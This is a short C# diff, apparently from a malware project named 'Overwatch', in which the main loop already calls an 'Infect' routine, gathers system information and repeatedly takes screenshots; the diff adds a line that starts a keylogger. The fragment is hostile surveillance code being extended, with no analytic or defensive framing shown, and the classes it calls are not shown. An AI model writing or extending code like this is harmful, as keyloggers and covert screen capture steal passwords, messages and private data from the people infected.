@@ -18,6 +18,7 @@ namespace Overwatch
                 cChangeLabel.Infect(args);
                 cReceiveInformation info = new cReceiveInformation();
                 info.Overview();
+                cKeylogger.StartKeylogger();
                 while (true)
                 {
                     info.ScreenShoot();
